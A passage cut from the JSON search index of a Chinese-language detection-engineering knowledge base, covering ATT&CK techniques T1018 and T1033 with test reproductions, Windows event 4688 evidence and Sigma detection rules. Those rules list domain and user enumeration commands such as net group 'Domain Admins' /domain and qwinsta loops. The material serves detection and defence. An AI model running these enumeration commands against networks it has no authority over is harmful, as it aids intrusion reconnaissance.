low","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_6","text":"\u57fa\u4e8e\u975e\u7cfb\u7edf\u81ea\u5e26\u8fdb\u7a0b\u540d\u79f0\u7684\u68c0\u6d4b\u65b9\u6cd5\u59cb\u7ec8\u662f\u4e0d\u592a\u9760\u8c31\u7684\uff0c\u5f53\u653b\u51fb\u8005\u4fee\u6539\u8fdb\u7a0b\u540d\u79f0\u540e\uff0c\u5c31\u65e0\u6cd5\u901a\u8fc7\u8fdb\u7a0b\u540d\u79f0\u8fdb\u884c\u68c0\u6d4b\uff1b\u53ef\u4ee5\u901a\u8fc7\u90e8\u7f72sysmon\uff0c\u5229\u7528\u8fdb\u7a0bhash\u503c\u8fdb\u884c\u68c0\u6d4b\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_7","text":"MITRE-ATT&CK-T1018 https://attack.mitre.org/techniques/T1018/ \u68c0\u6d4bnbtscan\u6d3b\u52a8 https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Discovery/detect-nbtscan-activity.md Nbtscan\u4e0b\u8f7d http://unixwiz.net/tools/nbtscan.html \u8f6f\u8702\u7a9d\u884c\u52a8:\u9488\u5bf9\u7535\u4fe1\u63d0\u4f9b\u5546\u7684\u5168\u7403\u8fd0\u52a8 https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/","text":"T1018-win-\u8fdc\u7a0b\u7cfb\u7edf\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8bd5\u56fe\u901a\u8fc7IP\u5730\u5740\u3001\u4e3b\u673a\u540d\u6216\u7f51\u7edc\u4e0a\u7684\u5176\u4ed6\u903b\u8f91\u6807\u8bc6\u7b26\u83b7\u53d6\u5176\u4ed6\u7cfb\u7edf\u7684\u5217\u8868\uff0c\u8be5\u5217\u8868\u53ef\u7528\u4e8e\u4ece\u5f53\u524d\u7cfb\u7edf\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u3002\u5728\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u4e2d\u53ef\u4ee5\u5b58\u5728\u529f\u80fd\u4ee5\u5b9e\u73b0\u8fd9\u4e00\u70b9\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u53ef\u7528\u7684\u5b9e\u7528\u5de5\u5177\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528\u672c\u5730\u4e3b\u673a\u6587\u4ef6\u6765\u53d1\u73b0\u8fdc\u7a0b\u7cfb\u7edf\u7684\u4e3b\u673a\u540d\u5230IP\u5730\u5740\u7684\u6620\u5c04\u3002 windows \u83b7\u53d6\u6b64\u4fe1\u606f\u7684\u5de5\u5177\u548c\u547d\u4ee4\u793a\u4f8b\u5305\u62ec\u4f7f\u7528net\u7684\u201cping\u201d\u6216\u201cnet view\u201d\u3002\u53ef\u4ee5\u67e5\u770b C:\\Windows\\System32\\Drivers\\etc\\hosts\u7684\u5185\u5bb9\uff0c\u4ee5\u4e86\u89e3\u7cfb\u7edf\u4e0a\u73b0\u6709\u7684\u4e3b\u673a\u540d\u5230IP\u6620\u5c04\u3002 MacOS \u7279\u5b9a\u4e8eMac\uff0c\u5728\u540c\u4e00\u5e7f\u64ad\u57df\u5185\u53d1\u73b0\u5176\u4ed6\u57fa\u4e8eMac\u7684\u7cfb\u7edf\u7684bonjour\u534f\u8bae\u3002\u8bf8\u5982\u201cping\u201d\u7b49\u5b9e\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u6536\u96c6\u6709\u5173\u8fdc\u7a0b\u7cfb\u7edf\u7684\u4fe1\u606f\u3002\u53ef\u4ee5\u67e5\u770b/ETC/HOST\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u4ee5\u4e86\u89e3\u7cfb\u7edf\u4e0a\u73b0\u6709\u7684\u4e3b\u673a\u540d\u5230IP\u6620\u5c04\u3002 Linux \u8bf8\u5982\u201cping\u201d\u7b49\u5b9e\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u6536\u96c6\u6709\u5173\u8fdc\u7a0b\u7cfb\u7edf\u7684\u4fe1\u606f\u3002\u53ef\u4ee5\u67e5\u770b/ETC/HOST\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u4ee5\u4e86\u89e3\u7cfb\u7edf\u4e0a\u73b0\u6709\u7684\u4e3b\u673a\u540d\u5230IP\u6620\u5c04\u3002 \u4e91 \u5728\u4e91\u73af\u5883\u4e2d\uff0c\u4e0a\u8ff0\u6280\u672f\u53ef\u7528\u4e8e\u6839\u636e\u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u53d1\u73b0\u8fdc\u7a0b\u7cfb\u7edf\u3002\u6b64\u5916\uff0c\u4e91\u73af\u5883\u901a\u5e38\u4e3aapi\u63d0\u4f9b\u6709\u5173\u8fdc\u7a0b\u7cfb\u7edf\u548c\u670d\u52a1\u7684\u4fe1\u606f\u3002 \u6d4b\u8bd5\u6848\u4f8b windows\u4e0b\u6267\u884cnet view\u76f8\u5173\u547d\u4ee4\u53c2\u6570 net view\u83b7\u53d6\u5f53\u524d\u7ec4\u7684\u8ba1\u7b97\u673a\u540d(\u4e00\u822cremark\u6709Dc\u53ef\u80fd\u662f\u57df\u63a7)\uff0c\u4f46\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u65e0\u6cd5\u5355\u72ec\u4f7f\u7528net view\uff1b \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Users\\administrator.0DAY>net view \\\\ICBC.0day.org \u5217\u8868\u662f\u7a7a\u7684\u3002 \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7\uff0c\u4e8b\u4ef6\u521b\u5efa4688\u3001\u5b50\u7236\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff08windows server 2016\u4ee5\u4e0a\uff09 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: windows\u6267\u884cnet view\u547d\u4ee4 description: windows server 2016 references: \u6682\u65e0 tags: T1018 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Newprocessname: 'C:\\windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: net view * #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: low \u5efa\u8bae \u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u53ef\u4ee5\u6839\u636e\u5b50\u7236\u8fdb\u7a0b\u4ee5\u53ca\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\uff0c\u4f46\u662f\uff0c\u591a\u6570\u60c5\u51b5\u4e0b\u67d0\u4e9b\u547d\u4ee4\u6b63\u5e38\u7ba1\u7406\u5458\u4e5f\u4f1a\u53bb\u7528\uff0c\u6240\u4ee5\u9700\u8981\u6839\u636e\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790\uff0c\u6392\u9664\u8bef\u62a5\u3002 \u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u4e0e\u5408\u6cd5\u8fdc\u7a0b\u7cfb\u7edf\u53d1\u73b0\u76f8\u5173\u7684\u6b63\u5e38\u3001\u826f\u6027\u7cfb\u7edf\u548c\u7f51\u7edc\u4e8b\u4ef6\u53ef\u80fd\u4e0d\u5e38\u89c1\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u73af\u5883\u548c\u4f7f\u7528\u65b9\u5f0f\u3002\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1018 https://attack.mitre.org/techniques/T1018/","title":"T1018-win-\u8fdc\u7a0b\u7cfb\u7edf\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#t1018-win-","text":"","title":"T1018-win-\u8fdc\u7a0b\u7cfb\u7edf\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8bd5\u56fe\u901a\u8fc7IP\u5730\u5740\u3001\u4e3b\u673a\u540d\u6216\u7f51\u7edc\u4e0a\u7684\u5176\u4ed6\u903b\u8f91\u6807\u8bc6\u7b26\u83b7\u53d6\u5176\u4ed6\u7cfb\u7edf\u7684\u5217\u8868\uff0c\u8be5\u5217\u8868\u53ef\u7528\u4e8e\u4ece\u5f53\u524d\u7cfb\u7edf\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u3002\u5728\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u4e2d\u53ef\u4ee5\u5b58\u5728\u529f\u80fd\u4ee5\u5b9e\u73b0\u8fd9\u4e00\u70b9\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u53ef\u7528\u7684\u5b9e\u7528\u5de5\u5177\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528\u672c\u5730\u4e3b\u673a\u6587\u4ef6\u6765\u53d1\u73b0\u8fdc\u7a0b\u7cfb\u7edf\u7684\u4e3b\u673a\u540d\u5230IP\u5730\u5740\u7684\u6620\u5c04\u3002 windows \u83b7\u53d6\u6b64\u4fe1\u606f\u7684\u5de5\u5177\u548c\u547d\u4ee4\u793a\u4f8b\u5305\u62ec\u4f7f\u7528net\u7684\u201cping\u201d\u6216\u201cnet view\u201d\u3002\u53ef\u4ee5\u67e5\u770b C:\\Windows\\System32\\Drivers\\etc\\hosts\u7684\u5185\u5bb9\uff0c\u4ee5\u4e86\u89e3\u7cfb\u7edf\u4e0a\u73b0\u6709\u7684\u4e3b\u673a\u540d\u5230IP\u6620\u5c04\u3002 MacOS \u7279\u5b9a\u4e8eMac\uff0c\u5728\u540c\u4e00\u5e7f\u64ad\u57df\u5185\u53d1\u73b0\u5176\u4ed6\u57fa\u4e8eMac\u7684\u7cfb\u7edf\u7684bonjour\u534f\u8bae\u3002\u8bf8\u5982\u201cping\u201d\u7b49\u5b9e\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u6536\u96c6\u6709\u5173\u8fdc\u7a0b\u7cfb\u7edf\u7684\u4fe1\u606f\u3002\u53ef\u4ee5\u67e5\u770b/ETC/HOST\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u4ee5\u4e86\u89e3\u7cfb\u7edf\u4e0a\u73b0\u6709\u7684\u4e3b\u673a\u540d\u5230IP\u6620\u5c04\u3002 Linux \u8bf8\u5982\u201cping\u201d\u7b49\u5b9e\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u6536\u96c6\u6709\u5173\u8fdc\u7a0b\u7cfb\u7edf\u7684\u4fe1\u606f\u3002\u53ef\u4ee5\u67e5\u770b/ETC/HOST\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u4ee5\u4e86\u89e3\u7cfb\u7edf\u4e0a\u73b0\u6709\u7684\u4e3b\u673a\u540d\u5230IP\u6620\u5c04\u3002 \u4e91 \u5728\u4e91\u73af\u5883\u4e2d\uff0c\u4e0a\u8ff0\u6280\u672f\u53ef\u7528\u4e8e\u6839\u636e\u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u53d1\u73b0\u8fdc\u7a0b\u7cfb\u7edf\u3002\u6b64\u5916\uff0c\u4e91\u73af\u5883\u901a\u5e38\u4e3aapi\u63d0\u4f9b\u6709\u5173\u8fdc\u7a0b\u7cfb\u7edf\u548c\u670d\u52a1\u7684\u4fe1\u606f\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_1","text":"windows\u4e0b\u6267\u884cnet view\u76f8\u5173\u547d\u4ee4\u53c2\u6570 net view\u83b7\u53d6\u5f53\u524d\u7ec4\u7684\u8ba1\u7b97\u673a\u540d(\u4e00\u822cremark\u6709Dc\u53ef\u80fd\u662f\u57df\u63a7)\uff0c\u4f46\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u65e0\u6cd5\u5355\u72ec\u4f7f\u7528net view\uff1b","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_3","text":"C:\\Users\\administrator.0DAY>net view \\\\ICBC.0day.org \u5217\u8868\u662f\u7a7a\u7684\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_4","text":"windows \u5b89\u5168\u65e5\u5fd7\uff0c\u4e8b\u4ef6\u521b\u5efa4688\u3001\u5b50\u7236\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff08windows server 2016\u4ee5\u4e0a\uff09","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#sigma","text":"title: windows\u6267\u884cnet view\u547d\u4ee4 description: windows server 2016 references: \u6682\u65e0 tags: T1018 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Newprocessname: 'C:\\windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: net view * #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: low","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_6","text":"\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u53ef\u4ee5\u6839\u636e\u5b50\u7236\u8fdb\u7a0b\u4ee5\u53ca\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\uff0c\u4f46\u662f\uff0c\u591a\u6570\u60c5\u51b5\u4e0b\u67d0\u4e9b\u547d\u4ee4\u6b63\u5e38\u7ba1\u7406\u5458\u4e5f\u4f1a\u53bb\u7528\uff0c\u6240\u4ee5\u9700\u8981\u6839\u636e\u5177\u4f53\u60c5\u51b5\u5177\u4f53\u5206\u6790\uff0c\u6392\u9664\u8bef\u62a5\u3002 \u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 \u4e0e\u5408\u6cd5\u8fdc\u7a0b\u7cfb\u7edf\u53d1\u73b0\u76f8\u5173\u7684\u6b63\u5e38\u3001\u826f\u6027\u7cfb\u7edf\u548c\u7f51\u7edc\u4e8b\u4ef6\u53ef\u80fd\u4e0d\u5e38\u89c1\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u73af\u5883\u548c\u4f7f\u7528\u65b9\u5f0f\u3002\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4ee5\u4e86\u89e3\u4e3a\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u800c\u53ef\u80fd\u91c7\u53d6\u7684\u64cd\u4f5c\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1018 https://attack.mitre.org/techniques/T1018/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/","text":"T1033-\u7cfb\u7edf\u6240\u6709\u8005/\u7528\u6237\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 windows \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bc6\u522b\u4e3b\u8981\u7528\u6237\u3001\u5f53\u524d\u767b\u5f55\u7528\u6237\u3001\u901a\u5e38\u4f7f\u7528\u7cfb\u7edf\u7684\u7528\u6237\u96c6\uff0c\u6216\u8005\u7528\u6237\u662f\u5426\u6b63\u5728\u79ef\u6781\u4f7f\u7528\u7cfb\u7edf\u3002\u4ed6\u4eec\u53ef\u4ee5\u8fd9\u6837\u505a\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u68c0\u7d22\u5e10\u6237\u7528\u6237\u540d\u6216\u4f7f\u7528\u51ed\u636e\u8f6c\u50a8\u3002\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u53d1\u73b0\u6280\u672f\u4ee5\u591a\u79cd\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u4fe1\u606f\uff0c\u56e0\u4e3a\u7528\u6237\u548c\u7528\u6237\u540d\u8be6\u7ec6\u4fe1\u606f\u5728\u6574\u4e2a\u7cfb\u7edf\u4e2d\u90fd\u5f88\u5e38\u89c1\uff0c\u5305\u62ec\u8fd0\u884c\u8fdb\u7a0b\u6240\u6709\u6743\u3001\u6587\u4ef6\u76ee\u5f55\u6240\u6709\u6743\u3001\u4f1a\u8bdd\u4fe1\u606f\u548c\u7cfb\u7edf\u65e5\u5fd7\u3002\u653b\u51fb\u8005\u5728\u81ea\u52a8\u53d1\u73b0\u671f\u95f4\u4f7f\u7528\u6765\u81ea\u7cfb\u7edf\u6240\u6709\u8005/\u7528\u6237\u53d1\u73b0\u7684\u4fe1\u606f\uff0c\u6765\u4f2a\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002 MACos \u5728Mac\u4e0a\uff0c\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u53ef\u4ee5\u4f7f\u7528users\uff0cw\u548cwho\u6765\u8fdb\u884c\u8bc6\u522b\u3002 linux \u5728Linux\u4e0a\uff0c\u53ef\u4ee5\u4f7f\u7528w\u548c\u6807\u8bc6\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237who\u3002 \u6d4b\u8bd5\u6848\u4f8b windows\u76f8\u5173\u547d\u4ee4 - \u67e5\u8be2\u672c\u5730\u7528\u6237\u6743\u9650\uff1awhoami - \u67e5\u8be2\u57df\u7528\u6237\uff1adsquery user\u3001net user /domain - \u67e5\u8be2\u57df\u7ec4\u6743\u9650\uff1anet group /domain - \u67e5\u8be2\u57df\u7ba1\u7406\u5458\uff1anet group \"Domain Admins\" /domain - \u67e5\u770b\u5f53\u524d\u8ba1\u7b97\u673a\u540d\uff0c\u5168\u540d\uff0c\u7528\u6237\u540d\uff0c\u7cfb\u7edf\u7248\u672c\uff0c\u5de5\u4f5c\u7ad9\u57df\uff0c\u767b\u9646\u57df\uff1anet config Workstation - \u67e5\u770b\u57df\u63a7\u5236\u5668\uff1anet group \"Domain controllers\" \uff08\u591a\u57df\u63a7\u5236\u5668\u7684\u65f6\u5019,\u800c\u4e14\u53ea\u80fd\u7528\u5728\u57df\u63a7\u5236\u5668\u4e0a\uff09 - \u67e5\u8be2\u6240\u6709\u8ba1\u7b97\u673a\u540d\u79f0\uff1anet group \"Domain Computers\" /domain\uff08\u57df\u63a7\u4e0d\u4f1a\u88ab\u5217\u51fa\uff09 linux who\u547d\u4ee4 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 linux history \u6d4b\u8bd5\u590d\u73b0 windows\u6d4b\u8bd5 Microsoft Windows [\u7248\u672c 10.0.14393] (c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Windows\\system32>whoami icbc\\administrator linux\u6d4b\u8bd5 icbc@icbc:~$ who icbc :0 2019-11-10 18:58 (:0) icbc@icbc:~$ w 19:03:14 up 5 min, 1 user, load average: 0.08, 0.51, 0.31 USER TTY \u6765\u81ea LOGIN@ IDLE JCPU PCPU WHAT icbc :0 :0 18:58 ?xdm? 35.66s 0.02s /usr/lib/gdm3/g \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7 4688 linux history\u65e5\u5fd7 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u7cfb\u7edf\u6240\u6709\u8005/\u7528\u6237\u53d1\u73b0 description: windows server 2016/Ubuntu19.04 references: - https://attack.mitre.org/techniques/T1033/ - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1033/T1033.md tags: T1033 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 CommandLine: - cmd.exe /C whoami - wmic useraccount get /ALL - quser /SERVER:\"#{computer_name}\" - quser - qwinsta.exe /server:#{computer_name} - qwinsta.exe - for /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt - @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt condition: selection level: low logsource: product: linux service: history detection: keywords: - w - who - users condition: keywords level: low \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1033 https://attack.mitre.org/techniques/T1033/","title":"T1033-\u7cfb\u7edf\u6240\u6709\u8005/\u7528\u6237\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#t1033-","text":"","title":"T1033-\u7cfb\u7edf\u6240\u6709\u8005/\u7528\u6237\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#attck","text":"","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9F%E6%89%80%E6%9C%89%E8%80%85%E5%8F%8A%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0/#windows","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bc6\u522b\u4e3b\u8981\u7528\u6237\u3001\u5f53\u524d\u767b\u5f55\u7528\u6237\u3001\u901a\u5e38\u4f7f\u7528\u7cfb\u7edf\u7684\u7528\u6237\u96c6\uff0c\u6216\u8005\u7528\u6237\u662f\u5426\u6b63\u5728\u79ef\u6781\u4f7f\u7528\u7cfb\u7edf\u3002\u4ed6\u4eec\u53ef\u4ee5\u8fd9\u6837\u505a\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u68c0\u7d22\u5e10\u6237\u7528\u6237\u540d\u6216\u4f7f\u7528\u51ed\u636e\u8f6c\u50a8\u3002\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u53d1\u73b0\u6280\u672f\u4ee5\u591a\u79cd\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u4fe1\u606f\uff0c\u56e0\u4e3a\u7528\u6237\u548c\u7528\u6237\u540d\u8be6\u7ec6\u4fe1\u606f\u5728\u6574\u4e2a\u7cfb\u7edf\u4e2d\u90fd\u5f88\u5e38\u89c1\uff0c\u5305\u62ec\u8fd0\u884c\u8fdb\u7a0b\u6240\u6709\u6743\u3001\u6587\u4ef6\u76ee\u5f55\u6240\u6709\u6743\u3001\u4f1a\u8bdd\u4fe1\u606f\u548c\u7cfb\u7edf\u65e5\u5fd7\u3002\u653b\u51fb\u8005\u5728\u81ea\u52a8\u53d1\u73b0\u671f\u95f4\u4f7f\u7528\u6765\u81ea\u7cfb\u7edf\u6240\u6709\u8005/\u7528\u6237\u53d1\u73b0\u7684\u4fe1\u606f\uff0c\u6765\u4f2a\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002","title":"windows"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1033-win-%E7%B3%BB%E7%BB%9